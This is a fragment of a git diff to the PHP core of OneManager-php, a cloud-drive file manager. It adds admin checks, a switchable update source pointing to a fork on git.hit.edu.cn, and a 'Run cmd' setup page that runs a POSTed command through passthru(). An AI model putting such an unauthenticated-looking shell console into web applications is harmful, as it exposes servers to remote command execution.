     $split = splitfirst($current_version, '.' . $current_ver)[0] . '.' . $current_ver;
     if (!($github_version = getcache('github_version'))) {
-        $tmp = curl('GET', 'https://raw.githubusercontent.com/qkqpttgf/OneManager-php/master/version');
+        //$tmp = curl('GET', 'https://raw.githubusercontent.com/qkqpttgf/OneManager-php/master/version');
+        $tmp = curl('GET', 'https://git.hit.edu.cn/ysun/OneManager-php/-/raw/master/version');
         if ($tmp['stat']==0) return 0;
         $github_version = $tmp['body'];
         savecache('github_version', $github_version);
@@ -849,7 +1100,7 @@ function needUpdate()
 function output($body, $statusCode = 200, $headers = ['Content-Type' => 'text/html'], $isBase64Encoded = false)
 {
     if (isset($_SERVER['Set-Cookie'])) $headers['Set-Cookie'] = $_SERVER['Set-Cookie'];
-    if (baseclassofdrive()=='Aliyundrive') $headers['Referrer-Policy'] = 'no-referrer';
+    if (baseclassofdrive()=='Aliyundrive' || baseclassofdrive()=='BaiduDisk') $headers['Referrer-Policy'] = 'no-referrer';
     //$headers['Referrer-Policy'] = 'same-origin';
     //$headers['X-Frame-Options'] = 'sameorigin';
     return [
@@ -863,11 +1114,11 @@ function output($body, $statusCode = 200, $headers = ['Content-Type' => 'text/ht
 function passhidden($path)
 {
     if ($_SERVER['admin']) return 0;
-    $path = str_replace('+','%2B',$path);
-    $path = str_replace('&amp;','&', path_format(urldecode($path)));
+    //$path = str_replace('+','%2B',$path);
+    //$path = str_replace('&amp;','&', path_format(urldecode($path)));
     if (getConfig('passfile') != '') {
-        $path = spurlencode($path,'/');
-        if (substr($path,-1)=='/') $path=substr($path,0,-1);
+        //$path = spurlencode($path,'/');
+        //if (substr($path,-1)=='/') $path=substr($path,0,-1);
         $hiddenpass=gethiddenpass($path, getConfig('passfile'));
         if ($hiddenpass != '') {
             return comppass($hiddenpass);
@@ -901,15 +1152,32 @@ function time_format($ISO)
     return date('Y-m-d H:i:s',strtotime($ISO . " UTC"));
 }
 
-function adminform($name = '', $pass = '', $path = '')
+function adminform($name = '', $pass = '', $storage = '', $path = '')
 {
-    $html = '<html><head><title>' . getconstStr('AdminLogin') . '</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"></head>';
+    $html = '<html>
+    <head>
+        <title>' . getconstStr('AdminLogin') . '</title>
+        <meta charset=utf-8>
+        <meta name=viewport content="width=device-width,initial-scale=1">
+    </head>';
     if ($name=='admin'&&$pass!='') {
-        $html .= '<meta http-equiv="refresh" content="3;URL=' . $path . '">
-        <body>' . getconstStr('LoginSuccess') . '</body></html>';
+        $html .= '
+        <!--<meta http-equiv="refresh" content="3;URL=' . $path . '">-->
+    <body>
+        ' . getconstStr('LoginSuccess') . '
+        <script>
+            localStorage.setItem("admin", "' . $storage . '");
+            var url = location.href;
+            var search = location.search;
+            url = url.substr(0, url.length-search.length);
+            if (search.indexOf("preview")>0) url += "?preview";
+            location = url;
+        </script>
+    </body>
+</html>';
         $statusCode = 201;
         date_default_timezone_set('UTC');
-        $_SERVER['Set-Cookie'] = $name . '=' . $pass . '; path=/; expires=' . date(DATE_COOKIE, strtotime('+7day'));
+        $_SERVER['Set-Cookie'] = $name . '=' . $pass . '; path=' . $_SERVER['base_path'] . '; expires=' . date(DATE_COOKIE, strtotime('+7day'));
         return output($html, $statusCode);
     }
     $statusCode = 401;
@@ -940,12 +1208,28 @@ function adminform($name = '', $pass = '', $path = '')
             f.password1.value = sha1(timestamp + "" + f.password1.value);
             return true;
         } catch {
-            alert("sha1.js not loaded.");
+            //alert("sha1.js not loaded.");
+            if (confirm("sha1.js not loaded.\n\nLoad from program?")) loadjs("?jsFile=sha1.min.js");
             return false;
         }
     }
+    function loadjs(url) {
+        var xhr = new XMLHttpRequest;
+        xhr.open("GET", url);
+        xhr.onload = function(e) {
+            if (xhr.status==200) {
+                var script = document.createElement("script");
+                script.type = "text/javascript";
+                script.text = xhr.responseText;
+                document.body.appendChild(script);
+            } else {
+                console.log(xhr.response);
+            }
+        }
+        xhr.send(null);
+    }
 </script>
-<script src="https://cdn.bootcss.com/js-sha1/0.6.0/sha1.min.js"></script>';
+<script src="https://www.unpkg.com/js-sha1@0.6.0/src/sha1.js"></script>';
     $html .= '</html>';
     return output($html, $statusCode);
 }
@@ -953,12 +1237,24 @@ function adminform($name = '', $pass = '', $path = '')
 function adminoperate($path)
 {
     global $drive;
-    $path1 = path_format($_SERVER['list_path'] . path_format($path));
+    if ($_SERVER['REQUEST_METHOD']=='POST') if (!driveisfine($_SERVER['disktag'], $drive)) return output($_SERVER['disktag']?'disk [ ' . $_SERVER['disktag'] . ' ] error.':'Not in drive', 403);
+    $path1 = path_format($_SERVER['list_path'] . '/' . $path);
     if (substr($path1, -1)=='/') $path1=substr($path1, 0, -1);
     $tmpget = $_GET;
     $tmppost = $_POST;
     $tmparr['statusCode'] = 0;
+
+    if (isset($tmpget['RefreshCache'])) {
+        //$path1 = path_format($_SERVER['list_path'] . path_format($path));
+        //if ($path1!='/'&&substr($path1, -1)=='/') $path1=substr($path1, 0, -1);
+        savecache('path_' . $path1 . '/?password', '', $_SERVER['disktag'], 1);
+        savecache('customTheme', '', '', 1);
+        return message('<meta http-equiv="refresh" content="2;URL=./">
+        <meta name=viewport content="width=device-width,initial-scale=1">', getconstStr('RefreshCache'), 202);
+    }
+
     if ( (isset($tmpget['rename_newname'])&&$tmpget['rename_newname']!=$tmpget['rename_oldname'] && $tmpget['rename_newname']!='') || (isset($tmppost['rename_newname'])&&$tmppost['rename_newname']!=$tmppost['rename_oldname'] && $tmppost['rename_newname']!='') ) {
+        if (!compareadminmd5('admin', getConfig('admin'), $_COOKIE['admin'], $_POST['_admin'])) return ['statusCode'=>403];
         if (isset($tmppost['rename_newname'])) $VAR = 'tmppost';
         else $VAR = 'tmpget';
         // rename 重命名
@@ -968,6 +1264,7 @@ function adminoperate($path)
         return $drive->Rename($file, ${$VAR}['rename_newname']);
     }
     if (isset($tmpget['delete_name']) || isset($tmppost['delete_name'])) {
+        if (!compareadminmd5('admin', getConfig('admin'), $_COOKIE['admin'], $_POST['_admin'])) return ['statusCode'=>403];
         if (isset($tmppost['delete_name'])) $VAR = 'tmppost';
         else $VAR = 'tmpget';
         // delete 删除
@@ -977,6 +1274,7 @@ function adminoperate($path)
         return $drive->Delete($file);
     }
     if ( (isset($tmpget['operate_action'])&&$tmpget['operate_action']==getconstStr('Encrypt')) || (isset($tmppost['operate_action'])&&$tmppost['operate_action']==getconstStr('Encrypt')) ) {
+        if (!compareadminmd5('admin', getConfig('admin'), $_COOKIE['admin'], $_POST['_admin'])) return ['statusCode'=>403];
         if (isset($tmppost['operate_action'])) $VAR = 'tmppost';
         else $VAR = 'tmpget';
         // encrypt 加密
@@ -984,10 +1282,11 @@ function adminoperate($path)
         if (${$VAR}['encrypt_folder']=='/') ${$VAR}['encrypt_folder']=='';
         $folder['path'] = path_format($path1 . '/' . spurlencode(${$VAR}['encrypt_folder'], '/'));
         $folder['name'] = ${$VAR}['encrypt_folder'];
-        $folder['id'] = ${$VAR}['id'];
+        $folder['id'] = ${$VAR}['encrypt_fileid'];
         return $drive->Encrypt($folder, getConfig('passfile'), ${$VAR}['encrypt_newpass']);
     }
     if (isset($tmpget['move_folder']) || isset($tmppost['move_folder'])) {
+        if (!compareadminmd5('admin', getConfig('admin'), $_COOKIE['admin'], $_POST['_admin'])) return ['statusCode'=>403];
         if (isset($tmppost['move_folder'])) $VAR = 'tmppost';
         else $VAR = 'tmpget';
         // move 移动
@@ -1012,6 +1311,7 @@ function adminoperate($path)
         }
     }
     if (isset($tmpget['copy_name']) || isset($tmppost['copy_name'])) {
+        if (!compareadminmd5('admin', getConfig('admin'), $_COOKIE['admin'], $_POST['_admin'])) return ['statusCode'=>403];
         if (isset($tmppost['copy_name'])) $VAR = 'tmppost';
         else $VAR = 'tmpget';
         // copy 复制
@@ -1021,6 +1321,7 @@ function adminoperate($path)
         return $drive->Copy($file);
     }
     if (isset($tmppost['editfile'])) {
+        if (!compareadminmd5('admin', getConfig('admin'), $_COOKIE['admin'], $_POST['_admin'])) return ['statusCode'=>403];
         // edit 编辑
         $file['path'] = $path1;
         $file['name'] = '';
@@ -1028,6 +1329,7 @@ function adminoperate($path)
         return $drive->Edit($file, $tmppost['editfile']);
     }
     if (isset($tmpget['create_name']) || isset($tmppost['create_name'])) {
+        if (!compareadminmd5('admin', getConfig('admin'), $_COOKIE['admin'], $_POST['_admin'])) return ['statusCode'=>403];
         if (isset($tmppost['create_name'])) $VAR = 'tmppost';
         else $VAR = 'tmpget';
         // create 新建
@@ -1035,14 +1337,6 @@ function adminoperate($path)
         $parent['name'] = '';
         $parent['id'] = ${$VAR}['create_fileid'];
         return $drive->Create($parent, ${$VAR}['create_type'], ${$VAR}['create_name'], ${$VAR}['create_text']);
-    }
-    if (isset($tmpget['RefreshCache'])) {
-        //$path1 = path_format($_SERVER['list_path'] . path_format($path));
-        //if ($path1!='/'&&substr($path1, -1)=='/') $path1=substr($path1, 0, -1);
-        savecache('path_' . $path1 . '/?password', '', $_SERVER['disktag'], 1);
-        savecache('customTheme', '', '', 1);
-        return message('<meta http-equiv="refresh" content="2;URL=./">
-        <meta name=viewport content="width=device-width,initial-scale=1">', getconstStr('RefreshCache'), 202);
     }
     return $tmparr;
 }
@@ -1061,6 +1355,7 @@ function splitfirst($str, $split)
         $tmp[0] = '';
         $tmp[1] = substr($str, $len);
     }
+    if ($tmp[1]===false) $tmp[1] = '';
     return $tmp;
 }
 
@@ -1078,6 +1373,7 @@ function splitlast($str, $split)
         $tmp[0] = '';
         $tmp[1] = substr($str, $len);
     }
+    if ($tmp[1]===false) $tmp[1] = '';
     return $tmp;
 }
 
@@ -1104,19 +1400,20 @@ function EnvOpt($needUpdate = 0)
     $envs = substr(json_encode(array_keys ($EnvConfigs)), 1, -1);
 
     $html = '<title>OneManager '.getconstStr('Setup').'</title>';
-    if (isset($_POST['updateProgram'])&&$_POST['updateProgram']==getconstStr('updateProgram')) {
-        $response = setConfigResponse(OnekeyUpate($_POST['auth'], $_POST['project'], $_POST['branch']));
+    if (isset($_POST['updateProgram'])&&$_POST['updateProgram']==getconstStr('updateProgram')) if (compareadminmd5('admin', getConfig('admin'), $_COOKIE['admin'], $_POST['_admin'])) {
+        $response = setConfigResponse(OnekeyUpate($_POST['GitSource'], $_POST['auth'], $_POST['project'], $_POST['branch']));
         if (api_error($response)) {
             $html = api_error_msg($response);
             $title = 'Error';
+            return message($html, $title, 400);
         } else {
             //WaitSCFStat();
-            $html .= getconstStr('UpdateSuccess') . '<br><a href="">' . getconstStr('Back') . '</a>';
+            $html .= getconstStr('UpdateSuccess') . '<br><a href="">' . getconstStr('Back') . '</a><script>var status = "' . $response['DplStatus'] . '";</script>';
             $title = getconstStr('Setup');
+            return message($html, $title, 202, 1);
         }
-        return message($html, $title);
-    }
-    if (isset($_POST['submit1'])) {
+    } else return message('please login again', 'Need login', 403);
+    if (isset($_POST['submit1'])) if (compareadminmd5('admin', getConfig('admin'), $_COOKIE['admin'], $_POST['_admin'])) {
         $_SERVER['disk_oprating'] = '';
         foreach ($_POST as $k => $v) {
             if (isShowedEnv($k) || $k=='disktag_del' || $k=='disktag_add' || $k=='disktag_rename' || $k=='disktag_copy') {
@@ -1127,11 +1424,11 @@ function EnvOpt($needUpdate = 0)
                 $f = substr($v, 0, 1);
                 if (strlen($v)==1) $v .= '_';
                 if (isCommonEnv($v)) {
-                    return message('Do not input ' . $envs . '<br><a href="">' . getconstStr('Back') . '</a>', 'Error', 201);
+                    return message('Do not input ' . $envs . '<br><a href="">' . getconstStr('Back') . '</a>', 'Error', 400);
                 } elseif (!(('a'<=$f && $f<='z') || ('A'<=$f && $f<='Z'))) {
-                    return message('<a href="">' . getconstStr('Back') . '</a>', 'Please start with letters', 201);
+                    return message('<a href="">' . getconstStr('Back') . '</a>', 'Please start with letters', 400);
                 } elseif (getConfig($v)) {
-                    return message('<a href="">' . getconstStr('Back') . '</a>', 'Same tag', 201);
+                    return message('<a href="">' . getconstStr('Back') . '</a>', 'Same tag', 400);
                 } else {
                     $tmp[$k] = $v;
                 }
@@ -1139,7 +1436,7 @@ function EnvOpt($needUpdate = 0)
             if ($k=='disktag_sort') {
                 $td = implode('|', json_decode($v));
                 if (strlen($td)==strlen(getConfig('disktag'))) $tmp['disktag'] = $td;
-                else return message('Something wrong.');
+                else return message('Something wrong.', 'ERROR', 400);
             }
             if ($k == 'disk') $_SERVER['disk_oprating'] = $v;
         }
@@ -1156,14 +1453,18 @@ function EnvOpt($needUpdate = 0)
         if (api_error($response)) {
             $html = api_error_msg($response);
             $title = 'Error';
+            return message($html, $title, 409);
         } else {
             $html .= getconstStr('Success') . '!<br>
-            <a href="">' . getconstStr('Back') . '</a>';
+            <a href="">' . getconstStr('Back') . '</a>
+            <script>
+                var status = "' . $response['DplStatus'] . '";
+            </script>';
             $title = getconstStr('Setup');
+            return message($html, $title, 200, 1);
         }
-        return message($html, $title);
-    }
-    if (isset($_POST['config_b'])) {
+    } else return message('please login again', 'Need login', 403);
+    if (isset($_POST['config_b'])) if (compareadminmd5('admin', getConfig('admin'), $_COOKIE['admin'], $_POST['_admin'])) {
         if (!$_POST['pass']) return output("{\"Error\": \"No admin pass\"}", 403);
         if (!is_numeric($_POST['timestamp'])) return output("{\"Error\": \"Error time\"}", 403);
         if (abs(time() - $_POST['timestamp']/1000) > 5*60) return output("{\"Error\": \"Timeout\"}", 403);
@@ -1220,8 +1521,8 @@ function EnvOpt($needUpdate = 0)
         } else {
             return output("{\"Error\": \"Admin pass error\"}", 403);
         }
-    }
-    if (isset($_POST['changePass'])) {
+    } else return message('please login again', 'Need login', 403);
+    if (isset($_POST['changePass'])) if (compareadminmd5('admin', getConfig('admin'), $_COOKIE['admin'], $_POST['_admin'])) {
         if (!is_numeric($_POST['timestamp'])) return message("Error time<a href=\"\">" . getconstStr('Back') . "</a>", "Error", 403);
         if (abs(time() - $_POST['timestamp']/1000) > 5*60) return message("Timeout<a href=\"\">" . getconstStr('Back') . "</a>", "Error", 403);
         if ($_POST['newPass1']==''||$_POST['newPass2']=='') return message("Empty new pass<a href=\"\">" . getconstStr('Back') . "</a>", "Error", 403);
@@ -1233,25 +1534,62 @@ function EnvOpt($needUpdate = 0)
             if (api_error($response)) {
                 return message(api_error_msg($response) . "<a href=\"\">" . getconstStr('Back') . "</a>", "Error", 403);
             } else {
-                return message("Success<a href=\"\">" . getconstStr('Back') . "</a>", "Success", 200);
+                return message("Success<a href=\"\">" . getconstStr('Back') . "</a><script>var status = \"" . $response['DplStatus'] . "\";</script>", "Success", 200, 1);
             }
         } else {
             return message("Old pass error<a href=\"\">" . getconstStr('Back') . "</a>", "Error", 403);
         }
-    }
+    } else return message('please login again', 'Need login', 403);
 
-    if (isset($_GET['preview'])) {
-        $preurl = $_SERVER['PHP_SELF'] . '?preview';
-    } else {
-        $preurl = path_format($_SERVER['PHP_SELF'] . '/');
-    }
     $html .= '
-<a href="' . $preurl . '">' . getconstStr('Back') . '</a><br>
+<a id="back" href="./">' . getconstStr('Back') . '</a><br>
+    <script>
+        if (location.search.indexOf("preview")>0) document.getElementById("back").href = "?preview";
+    </script>
 ';
+    if ($_GET['setup']==='cmd') {
+        $statusCode = 200;
+        $html .= '
+OneManager DIR: ' . __DIR__ . '
+<form name="form1" method="POST" action="">
+    <input id="inputarea" name="cmd" style="width:100%" value="' . htmlspecialchars($_POST['cmd']) . '" placeholder="ls, pwd, cat"><br>
+    <input type="submit" value="post">
+</form>';
+        if ($_POST['cmd']!='') {
+            $html .= '
+<pre>';
+            @ob_start();
+            passthru($_POST['cmd'], $cmdstat);
+            $html .= '
+stat: ' . $cmdstat . '
+output:
+
+';
+            if ($cmdstat>0) $statusCode = 400;
+            if ($cmdstat===1) $statusCode = 403;
+            if ($cmdstat===127) $statusCode = 404;
+            $html .= htmlspecialchars(ob_get_clean());
+            $html .= '</pre>';
+        }
+        $html .= '
+<script>
+    setTimeout(function () {
+        let inputarea = document.getElementById(\'inputarea\');
+        //console.log(a + ", " + inputarea.value);
+        inputarea.focus();
+        inputarea.setSelectionRange(inputarea.value.length, inputarea.value.length);
+    }, 500);
+</script>';
+        return message($html, 'Run cmd', $statusCode);
+    }
+    if ($_GET['setup']==='auth') {
+        return changeAuthKey();
+    }
     if ($_GET['setup']==='platform') {
         $frame .= '
 <table border=1 width=100%>
-    <form name="common" action="" method="post">';
+    <form name="common" action="" method="post">
+        <input name="_admin" type="hidden" value="">';
     foreach ($EnvConfigs as $key => $val) if (isCommonEnv($key) && isShowedEnv($key)) {
         $frame .= '
         <tr>
@@ -1301,7 +1639,7 @@ function EnvOpt($needUpdate = 0)
         <tr><td><input type="submit" name="submit1" value="' . getconstStr('Setup') . '"></td><td></td></tr>
     </form>
 </table><br>';
-    } elseif (isset($_GET['disktag'])&&in_array($_GET['disktag'], $disktags)) {
+    } elseif (isset($_GET['disktag'])&&$_GET['disktag']!==true&&in_array($_GET['disktag'], $disktags)) {
         $disktag = $_GET['disktag'];
         $disk_tmp = null;
         $diskok = driveisfine($disktag, $disk_tmp);
@@ -1311,6 +1649,7 @@ function EnvOpt($needUpdate = 0)
         <td>
             <form action="" method="post" style="margin: 0" onsubmit="return renametag(this);">
                 <input type="hidden" name="disktag_rename" value="' . $disktag . '">
+                <input name="_admin" type="hidden" value="">
                 <input type="text" name="disktag_newname" value="' . $disktag . '" placeholder="' . getconstStr('EnvironmentsDescription')['disktag'] . '">
                 <input type="submit" name="submit1" value="' . getconstStr('RenameDisk') . '">
             </form>
@@ -1322,12 +1661,14 @@ function EnvOpt($needUpdate = 0)
     <td>
         <form action="" method="post" style="margin: 0" onsubmit="return deldiskconfirm(this);">
             <input type="hidden" name="disktag_del" value="' . $disktag . '">
+            <input name="_admin" type="hidden" value="">
             <input type="submit" name="submit1" value="' . getconstStr('DelDisk') . '">
         </form>
     </td>
     <td>
         <form action="" method="post" style="margin: 0" onsubmit="return cpdiskconfirm(this);">
             <input type="hidden" name="disktag_copy" value="' . $disktag . '">
+            <input name="_admin" type="hidden" value="">
             <input type="submit" name="submit1" value="' . getconstStr('CopyDisk') . '">
         </form>
     </td>
@@ -1355,13 +1696,29 @@ function EnvOpt($needUpdate = 0)
 
             $frame .= '
 <form name="' . $disktag . '" action="" method="post">
+    <input name="_admin" type="hidden" value="">
     <input type="hidden" name="disk" value="' . $disktag . '">';
             foreach ($EnvConfigs as $key => $val) if (isInnerEnv($key) && isShowedEnv($key)) {
-                $frame .= '
+                if ($key=='diskDisplay') {
+                    $frame .= '
+    <tr>
+        <td><label>' . $key . '</label></td>
+        <td width=100%>
+            <select name="' . $key . '">
+                <option value=""' . (getConfig($key, $disktag)===''?' selected':'') . '> </option>
+                <option value="hidden"' . (getConfig($key, $disktag)==='hidden'?' selected':'') . '>hidden</option>
+                <option value="disable"' . (getConfig($key, $disktag)==='disable'?' selected':'') . '>disable</option>
+            </select>
+            ' . getconstStr('EnvironmentsDescription')[$key] . '
+        </td>
+    </tr>';
+                } else {
+                    $frame .= '
     <tr>
         <td><label>' . $key . '</label></td>
         <td width=100%><input type="text" name="' . $key . '" value="' . getConfig($key, $disktag) . '" placeholder="' . getconstStr('EnvironmentsDescription')[$key] . '" style="width:100%"></td>
     </tr>';
+                }
             }
             $frame .= '
     <tr><td></td><td><input type="submit" name="submit1" value="' . getconstStr('Setup') . '"></td></tr>
@@ -1400,7 +1757,7 @@ function EnvOpt($needUpdate = 0)
             alert(\'Do not input ' . $envs . '\');
             return false;
         }
-        var reg = /^[a-zA-Z]([_a-zA-Z0-9]{1,20})$/;
+        var reg = /^[a-zA-Z]([_a-zA-Z0-9]{1,})$/;
         if (!reg.test(t.disktag_newname.value)) {
             alert(\'' . getconstStr('TagFormatAlert') . '\');
             return false;
@@ -1409,11 +1766,9 @@ function EnvOpt($needUpdate = 0)
     }
 </script>';
     } else {
-        //$_GET['disktag'] = '';
-        $Driver_arr = scandir(__DIR__ . $slash . 'disk');
         if (count($disktags)>1) {
             $frame .= '
-<script src="//cdn.bootcss.com/Sortable/1.8.3/Sortable.js"></script>
+<script src="https://www.unpkg.com/sortablejs@1.14.0/Sortable.min.js"></script>
 <style>
     .sortable-ghost {
         opacity: 0.4;
@@ -1424,23 +1779,26 @@ function EnvOpt($needUpdate = 0)
         cursor: move;
     }
 </style>
+' . getconstStr('DragSort') . ':
+<form id="sortdisks_form" action="" method="post" style="margin: 0" onsubmit="return dragsort(this);">
 <table border=1>
-    <form id="sortdisks_form" action="" method="post" style="margin: 0" onsubmit="return dragsort(this);">
-    <tr id="sortdisks">
-        <input type="hidden" name="disktag_sort" value="">';
+    <tbody id="sortdisks">
+    <input type="hidden" name="disktag_sort" value="">';
             $num = 0;
             foreach ($disktags as $disktag) {
                 if ($disktag!='') {
                     $num++;
                     $frame .= '
-        <td>' . $disktag . '</td>';
+        <tr class="sorthandle"><td>' . $num . '</td><td> ' . $disktag . '</td></tr>';
                 }
             }
             $frame .= '
-    </tr>
-    <tr><td colspan="' . $num . '">' . getconstStr('DragSort') . '<input type="submit" name="submit1" value="' . getconstStr('SubmitSortdisks') . '"></td></tr>
-    </form>
+    </tbody>
+    <input name="_admin" type="hidden" value="">
 </table>
+    <input type="submit" name="submit1" value="' . getconstStr('SubmitSortdisks') . '">
+</form>
+
 <script>
     var disks=' . json_encode($disktags) . ';
     function change(arr, oldindex, newindex) {
@@ -1473,7 +1831,8 @@ function EnvOpt($needUpdate = 0)
         }
         return true;
     }
-    Sortable.create(document.getElementById(\'sortdisks\'), {
+    new Sortable(document.getElementById(\'sortdisks\'), {
+        handle: \'.sorthandle\',
         animation: 150,
         onEnd: function (evt) { //拖拽完毕之后发生该事件
             //console.log(evt.oldIndex);
@@ -1486,6 +1845,7 @@ function EnvOpt($needUpdate = 0)
     });
 </script><br>';
         }
+        $Driver_arr = scandir(__DIR__ . $slash . 'disk');
         $frame .= '
 <select name="DriveType" onchange="changedrivetype(this.options[this.options.selectedIndex].value)">';
         foreach ($Driver_arr as $v1) {
@@ -1510,7 +1870,7 @@ function EnvOpt($needUpdate = 0)
             $canOneKeyUpate = 1;
         } elseif (isset($_SERVER['HEROKU_APP_DIR'])&&$_SERVER['HEROKU_APP_DIR']==='/app') {
             $canOneKeyUpate = 1;
-        } elseif (isset($_SERVER['FC_SERVER_PATH'])&&$_SERVER['FC_SERVER_PATH']==='/var/fc/runtime/php7.2') {
+        } elseif (isset($_SERVER['FC_FUNC_CODE_PATH'])) {
             $canOneKeyUpate = 1;
         } elseif (isset($_SERVER['BCE_CFC_RUNTIME_NAME'])&&$_SERVER['BCE_CFC_RUNTIME_NAME']=='php7') {
             $canOneKeyUpate = 1;
@@ -1525,24 +1885,44 @@ function EnvOpt($needUpdate = 0)
                 $canOneKeyUpate = 1;
             }
         }
-        $frame .= '<a href="https://github.com/qkqpttgf/OneManager-php" target="_blank">Github</a>';
+        $frame .= '
+        <a href="https://github.com/qkqpttgf/OneManager-php" target="_blank">Github</a>
+<a href="https://git.hit.edu.cn/ysun/OneManager-php" target="_blank">HIT Gitlab</a><br><br>
+';
         if (!$canOneKeyUpate) {
             $frame .= '
 ' . getconstStr('CannotOneKeyUpate') . '<br>';
         } else {
             $frame .= '
 <form name="updateform" action="" method="post">
+    <input name="_admin" type="hidden" value="">
+    Update from
+    <select name="GitSource" onchange="changeGitSource(this)">
+        <option value="Github" selected>Github</option>
+        <option value="HITGitlab">HIT Gitlab</option>
+    </select>
     <input type="text" name="auth" size="6" placeholder="auth" value="qkqpttgf">
     <input type="text" name="project" size="12" placeholder="project" value="OneManager-php">
-    <button name="QueryBranchs" onclick="querybranchs();return false;">' . getconstStr('QueryBranchs') . '</button>
+    <button name="QueryBranchs" onclick="querybranchs(this);return false;">' . getconstStr('QueryBranchs') . '</button>
     <select name="branch">
         <option value="master">master</option>
     </select>
     <input type="submit" name="updateProgram" value="' . getconstStr('updateProgram') . '">
 </form>
+
 <script>
-    function querybranchs()
-    {
+    function changeGitSource(d) {
+        if (d.options[d.options.selectedIndex].value=="Github") document.updateform.auth.value = "qkqpttgf";
+        if (d.options[d.options.selectedIndex].value=="HITGitlab") document.updateform.auth.value = "ysun";
+        document.updateform.QueryBranchs.style.display = null;
+        document.updateform.branch.options.length = 0;
+        document.updateform.branch.options.add(new Option("master", "master"));
+    }
+    function querybranchs(b) {
+        if (document.updateform.GitSource.options[document.updateform.GitSource.options.selectedIndex].value=="Github") return Githubquerybranchs(b);
+        if (document.updateform.GitSource.options[document.updateform.GitSource.options.selectedIndex].value=="HITGitlab") return HITquerybranchs(b);
+    }
+    function Githubquerybranchs(b) {
         var xhr = new XMLHttpRequest();
         xhr.open("GET", "https://api.github.com/repos/"+document.updateform.auth.value+"/"+document.updateform.project.value+"/branches");
         //xhr.setRequestHeader("User-Agent","qkqpttgf/OneManager");
@@ -1554,7 +1934,50 @@ function EnvOpt($needUpdate = 0)
                     document.updateform.branch.options.add(new Option(e.name,e.name));
                     if ("master"==e.name) document.updateform.branch.options[document.updateform.branch.options.length-1].selected = true; 
                 });
-                document.updateform.QueryBranchs.style.display="none";
+                //document.updateform.QueryBranchs.style.display="none";
+                b.style.display="none";
+            } else {
+                alert(xhr.responseText+"\n"+xhr.status);
+            }
+        }
+        xhr.onerror = function(e){
+            alert("Network Error "+xhr.status);
+        }
+        xhr.send(null);
+    }
+    function HITquerybranchs(b) {
+        // https://git.hit.edu.cn/api/v4/projects/383/repository/branches/
+        var pro_id;
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://git.hit.edu.cn/api/v4/projects");
+        //xhr.setRequestHeader("User-Agent","qkqpttgf/OneManager");
+        xhr.onload = function(e){
+            //console.log(xhr.responseText+","+xhr.status);
+            if (xhr.status==200) {
+                //document.updateform.branch.options.length=0;
+                JSON.parse(xhr.responseText).forEach( function (e) {
+                    if (e.name===document.updateform.project.value && e.namespace.path===document.updateform.auth.value) {
+                        //console.log(e.id);
+                        pro_id = e.id;
+                    }
+                });
+                //console.log(pro_id);
+                var xhr1 = new XMLHttpRequest();
+                xhr1.open("GET", "https://git.hit.edu.cn/api/v4/projects/"+pro_id+"/repository/branches");
+                xhr1.onload = function(e){
+                    if (xhr1.status==200) {
+                        document.updateform.branch.options.length=0;
+                        JSON.parse(xhr1.responseText).forEach( function (e) {
+                            document.updateform.branch.options.add(new Option(e.name,e.name));
+                            if ("master"==e.name) document.updateform.branch.options[document.updateform.branch.options.length-1].selected = true; 
+                        });
+                    } else {
+                        alert(xhr1.responseText+"\n"+xhr1.status);
+                    }
+                }
+                xhr1.send(null);
+                //document.updateform.QueryBranchs.style.display="none";
+                b.style.display="none";
             } else {
                 alert(xhr.responseText+"\n"+xhr.status);
             }
@@ -1569,43 +1992,44 @@ function EnvOpt($needUpdate = 0)
         }
         if ($needUpdate) {
             $frame .= '<div style="position: relative; word-wrap: break-word;">
-        ' . str_replace("\r", '<br>', $_SERVER['github_ver_new']) . '
+        ' . str_replace("\n", '<br>', $_SERVER['github_ver_new']) . '
 </div>
 <button onclick="document.getElementById(\'github_ver_old\').style.display=(document.getElementById(\'github_ver_old\').style.display==\'none\'?\'\':\'none\');">More...</button>
 <div id="github_ver_old" style="position: relative; word-wrap: break-word; display: none">
-        ' . str_replace("\r", '<br>', $_SERVER['github_ver_old']) . '
+        ' . str_replace("\n", '<br>', $_SERVER['github_ver_old']) . '
 </div>';
         }/* else {
             $frame .= getconstStr('NotNeedUpdate');
         }*/
-        $frame .= '<br>
-<script src="https://cdn.bootcss.com/js-sha1/0.6.0/sha1.min.js"></script>
+        $frame .= '<br><br>
+<script src="https://www.unpkg.com/js-sha1@0.6.0/src/sha1.js"></script>
 <table>
     <form id="change_pass" name="change_pass" action="" method="POST" onsubmit="return changePassword(this);">
+        <input name="_admin" type="hidden" value="">
     <tr>
-        <td>old pass:</td><td><input type="password" name="oldPass">
+        <td>' . getconstStr('OldPassword') . ':</td><td><input type="password" name="oldPass">
         <input type="hidden" name="timestamp"></td>
     </tr>
     <tr>
-        <td>new pass:</td><td><input type="password" name="newPass1"></td>
+        <td>' . getconstStr('NewPassword') . ':</td><td><input type="password" name="newPass1"></td>
     </tr>
     <tr>
-        <td>reinput:</td><td><input type="password" name="newPass2"></td>
+        <td>' . getconstStr('ReInput') . ':</td><td><input type="password" name="newPass2"></td>
     </tr>
     <tr>
-        <td></td><td><button name="changePass" value="changePass">Change Admin Pass</button></td>
+        <td></td><td><button name="changePass" value="changePass">' . getconstStr('ChangAdminPassword') . '</button></td>
     </tr>
     </form>
 </table><br>
 <table>
     <form id="config_f" name="config" action="" method="POST" onsubmit="return false;">
     <tr>
-        <td>admin pass:<input type="password" name="pass">
-        <button name="config_b" value="export" onclick="exportConfig(this);">export</button></td>
+        <td>' . getconstStr('AdminPassword') . ':<input type="password" name="pass">
+        <button name="config_b" value="export" onclick="exportConfig(this);">' . getconstStr('export') . '</button></td>
     </tr>
     <tr>
-        <td>config:<textarea name="config_t"></textarea>
-        <button name="config_b" value="import" onclick="importConfig(this);">import</button></td>
+        <td>' . getconstStr('config') . ':<textarea name="config_t"></textarea>
+        <button name="config_b" value="import" onclick="importConfig(this);">' . getconstStr('import') . '</button></td>
     </tr>
     </form>
 </table><br>
@@ -1619,7 +2043,7 @@ function EnvOpt($needUpdate = 0)
         try {
             sha1(1);
         } catch {
-            alert("sha1.js not loaded.");
+            if (confirm("sha1.js not loaded.\n\nLoad from program?")) loadjs("?jsFile=sha1.min.js");
             return false;
         }
         var timestamp = new Date().getTime();
@@ -1641,7 +2065,7 @@ function EnvOpt($needUpdate = 0)
         xhr.onerror = function(e){
             alert("Network Error "+xhr.status);
         }
